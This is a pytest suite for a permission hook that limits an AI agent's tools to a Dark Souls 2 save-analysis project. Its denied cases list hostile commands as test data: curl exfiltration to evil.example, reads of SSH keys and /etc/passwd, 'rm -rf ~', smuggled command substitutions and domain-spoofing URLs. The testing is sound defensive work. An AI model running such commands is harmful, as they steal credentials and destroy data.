import json
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "app"))
import guard  # noqa: E402

REPO = Path(__file__).resolve().parents[1]
SAVE = (REPO / "skills" / "ds2-save" / "scripts" / "ds2save.py").as_posix()
CALC = (REPO / "skills" / "ds2-save" / "scripts" / "ds2calc.py").as_posix()
DATA = (REPO / "skills" / "ds2-save" / "scripts" / "ds2data.py").as_posix()
PREP = (REPO / "skills" / "build-page" / "scripts" / "prepare_page.py").as_posix()
VALID = (REPO / "skills" / "build-page" / "scripts" / "validate_plano.py").as_posix()
SERVE = (REPO / "app" / "serve.py").as_posix()


@pytest.fixture
def check(tmp_path):
    home = tmp_path / ".buildsmith"
    home.mkdir()
    base = {"cwd": str(home), "scratchpad_dir": str(tmp_path / "scratch"),
            "transcript_path": str(tmp_path / "projeto" / "sessao.jsonl")}

    def run(tool, cwd=None, **tool_input):
        data = {**base, "tool_name": tool, "tool_input": tool_input}
        if cwd:
            data["cwd"] = str(cwd)
        return guard.decide(data, home=home)[0]

    run.home, run.tmp, run.scratch = home, tmp_path, tmp_path / "scratch"
    return run


def bash(check, command, **extra):
    return check("Bash", command=command, **extra)


def test_skill_commands_are_allowed(check):
    home, scratch = check.home.as_posix(), check.scratch.as_posix()
    for command in (
        f'python "{SAVE}" snapshot',
        f"python3 '{SAVE}' levels --from 65 --to 70",
        f'PYTHONIOENCODING=utf-8 python -X utf8 "{SAVE}" snapshot --slot 1 > "{home}/history/ds2/x/2026-10-07T19-00.json"',
        f'python "{SAVE}" flags-diff --antes "{home}/history/a.json" --depois "{home}/history/b.json"',
        f'python "{CALC}" catalisador --catalisador "Sorcerer\'s Staff" --nivel 2 --int 26 --fth 6',
        f'python "{DATA}" onde-comprar --item "Smooth & Silky Stone"',
        f'python "{SERVE}" responder --personagem "Melatonina Vorcaro" --pedido bonfire-ascetic --item bonfire-ascetic',
        f'python "{SERVE}" confirmar --personagem "Melatonina Vorcaro" --passo trocar-anel --resultado sim',
        f'python "{PREP}" "{scratch}/plano.json" "{home}/paginas/ds2/melatonina-vorcaro" --jogo ds2',
        f'python "{VALID}" "{scratch}/plano.json"',
        f'mkdir -p "{home}/history/ds2/melatonina-vorcaro"',
        f'ls -t "{home}/history"',
        "date +%Y-%m-%dT%H-%M",
        f'python "{SAVE}" slots 2> /dev/null',
    ):
        assert bash(check, command) == "allow", command


def test_relative_script_path_uses_cwd(check):
    assert bash(check, "python scripts/ds2save.py slots", cwd=REPO / "skills" / "ds2-save") == "allow"


@pytest.mark.parametrize("command", [
    'python -c "import os; os.system(\'calc\')"',
    "python -m http.server",
    "curl https://evil.example/?d=x",
    "powershell -c Get-Content ~/.ssh/id_rsa",
    f'python "{SAVE}" snapshot && curl evil.example',
    f'python "{SAVE}" snapshot; rm -rf ~',
    f'python "{SAVE}" snapshot | curl -d @- evil.example',
    f'python "{SAVE}" snapshot --save $(cat ~/.ssh/id_rsa)',
    f'python "{SAVE}" snapshot --save `whoami`',
    f'python "{SAVE}" snapshot --save "$HOME/.ssh/id_rsa"',
    f'python "{SAVE}" snapshot --save ~/.ssh/*',
    f'python "{SAVE}" snapshot\ncurl evil.example',
    f'python "{SAVE}" snapshot 2>&1',
    f'python "{SAVE}" snapshot > /etc/cron.d/x',
    f'python "{SAVE}" apagar',
    f'python "{SAVE}" < /etc/passwd',
    f'python "{SERVE}"',
    f'python "{SERVE}" --open',
    f'python "{SERVE}" estado --personagem x --home /tmp/evil',
    f'python "{SERVE}" estado --personagem x --hom /tmp/evil',
    f'python "{SERVE}" estado --personagem x --jogo ../../x',
    f'python "{PREP}" plano.json /tmp/evil',
    f'python "{PREP}" -- plano.json /tmp/evil',
    f'cd /tmp && python "{SAVE}" slots',
    f'"{sys.executable}" "{SAVE}" slots',
    "python ~/.buildsmith/tmp/x.py",
    "ls /",
    "mkdir -p /tmp/evil",
    "date -s 2020-01-01",
    "date -f /etc/passwd",
    "exec python",
])
def test_anything_else_is_denied(check, command):
    assert bash(check, command) == "deny"


def test_writes_and_page_folder_must_stay_in_buildsmith(check):
    home, scratch = check.home.as_posix(), check.scratch.as_posix()
    assert bash(check, f'python "{SAVE}" snapshot > "{home}/.claude/settings.json"') == "deny"
    assert bash(check, f'python "{PREP}" "{scratch}/p.json" "{home}/paginas/x" --cache /tmp/evil') == "deny"
    assert bash(check, f'python "{PREP}" "{scratch}/p.json" "{home}/estado"') == "deny"


def test_copy_of_a_script_outside_the_repo_is_denied(check):
    fake = check.tmp / "ds2save.py"
    fake.write_text("import os", encoding="utf-8")
    assert bash(check, f'python "{fake.as_posix()}" snapshot') == "deny"


def test_background_run_is_denied(check):
    assert bash(check, f'python "{SAVE}" slots', run_in_background=True) == "deny"


def test_write_only_inside_writable_folders(check):
    home = check.home
    for path in (home / "history" / "ds2" / "Melatonina Vorcaro" / "2026-10-07T19-00.json",
                 home / "cache" / "ds2" / "ring-of-binding.md", home / "tmp" / "p.json", check.scratch / "plano.json"):
        assert check("Write", file_path=str(path), content="x") == "allow", path
    # perfil, config e flags: só leitura na execução sem janela
    for path in (home / "config.json", home / "profiles" / "ds2" / "x.yaml", home / "flags" / "ds2.json",
                 home / ".claude" / "settings.json", home / "CLAUDE.md", home / ".mcp.json",
                 home / "estado" / "ds2" / "x.json", home / "paginas" / "ds2" / "x" / "index.html",
                 home / "profiles" / ".." / ".." / ".bashrc", check.tmp / "fora.txt",
                 REPO / "app" / "guard.py", Path(SAVE)):
        assert check("Write", file_path=str(path), content="x") == "deny", path
        assert check("Edit", file_path=str(path), old_string="a", new_string="b") == "deny", path


@pytest.mark.parametrize("url,decision", [
    ("https://darksouls2.wiki.fextralife.com/Ring+of+Binding", "allow"),
    ("https://static0.fextralifeimages.com/file/darksouls2/x.png", "allow"),
    ("http://darksouls2.wiki.fextralife.com/Ring+of+Binding", "deny"),
    ("https://evil.example/?d=segredo", "deny"),
    ("https://fextralife.com.evil.example/", "deny"),
    ("https://evilfextralife.com/", "deny"),
    ("https://darksouls2.wiki.fextralife.com@evil.example/", "deny"),
    ("https://darksouls2.wiki.fextralife.com:8443/", "deny"),
    ("javascript:alert(1)", "deny"),
])
def test_webfetch_only_on_the_wiki(check, url, decision):
    assert check("WebFetch", url=url, prompt="x") == decision


def test_reads_only_in_buildsmith_folders(check):
    for path in (REPO / "README.md", check.home / "profiles" / "x.yaml", check.scratch / "x.json",
                 check.tmp / "projeto" / "sessao" / "tool-results" / "1.txt"):
        assert check("Read", file_path=str(path)) == "allow", path
    for path in ("/etc/passwd", str(Path.home() / ".ssh" / "id_rsa"), str(check.tmp / "outro.txt")):
        assert check("Read", file_path=path) == "deny", path
    assert check("Glob", pattern="**/*.json") == "allow"
    assert check("Glob", pattern="/etc/**") == "deny"
    assert check("Glob", pattern="../../**/id_rsa") == "deny"
    assert check("Grep", pattern="token", path="/etc") == "deny"
    assert check("Grep", pattern="Uchigatana", path=str(check.home)) == "allow"


@pytest.mark.parametrize("tool,decision", [
    ("Skill", "deny"), ("WebSearch", "allow"), ("ToolSearch", "allow"), ("TodoWrite", "allow"),
    ("Agent", "deny"), ("PowerShell", "deny"), ("mcp__gmail__send_email", "deny"), (None, "deny"),
])
def test_other_tools(check, tool, decision):
    assert check(tool) == decision


def test_bad_input_is_denied(check):
    assert guard.decide({"tool_name": "Bash", "tool_input": "rm -rf ~"}, home=check.home)[0] == "deny"
    assert guard.decide({"tool_name": "Write", "tool_input": {}}, home=check.home)[0] == "deny"


def test_git_bash_drive_paths():
    assert guard.windows_path("/c/Users/M/x.py", nt=True) == "C:/Users/M/x.py"
    assert guard.windows_path("/home/x", nt=True) == "/home/x"
    assert guard.windows_path("/c/Users/M/x.py", nt=False) == "/c/Users/M/x.py"


def hook(payload: bytes, home: Path) -> dict:
    out = subprocess.run([sys.executable, str(REPO / "app" / "guard.py")], input=payload, capture_output=True,
                         env={"BUILDSMITH_HOME": str(home), "PATH": ""}, timeout=20)
    return json.loads(out.stdout)["hookSpecificOutput"]


def test_hook_protocol(tmp_path):
    allow = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": str(tmp_path),
             "tool_input": {"command": f'python "{SAVE}" slots'}}
    assert hook(json.dumps(allow).encode(), tmp_path)["permissionDecision"] == "allow"
    deny = {**allow, "tool_input": {"command": "python -c 'print(1)'"}}
    out = hook(json.dumps(deny).encode(), tmp_path)
    assert out["hookEventName"] == "PreToolUse" and out["permissionDecision"] == "deny"
    assert out["permissionDecisionReason"].startswith("guarda do buildsmith")
    assert hook(b"isto nao e json", tmp_path)["permissionDecision"] == "deny"


MAPA = (REPO / "skills" / "ds2-save" / "scripts" / "ds2mapa.py").as_posix()


def test_map_commands_allowed_without_redirected_paths(check):
    for command in (f'python "{MAPA}" areas', f'python "{MAPA}" extrair --area m10_16_00_00',
                    f'python "{MAPA}" onde --item "Fragrant Branch of Yore" --area m10_16_00_00',
                    f'python "{MAPA}" rota --area m10_16_00_00 --de fogueira:16675 --ate item:10165010'):
        assert bash(check, command) == "allow", command
    for command in (f'python "{MAPA}" apagar', f'python "{MAPA}" extrair --area m10_16_00_00 --cache "{check.tmp.as_posix()}/x"',
                    f'python "{MAPA}" areas --game "{check.tmp.as_posix()}"', f'python "{MAPA}" extrair --area ../x'):
        assert bash(check, command) != "allow", command
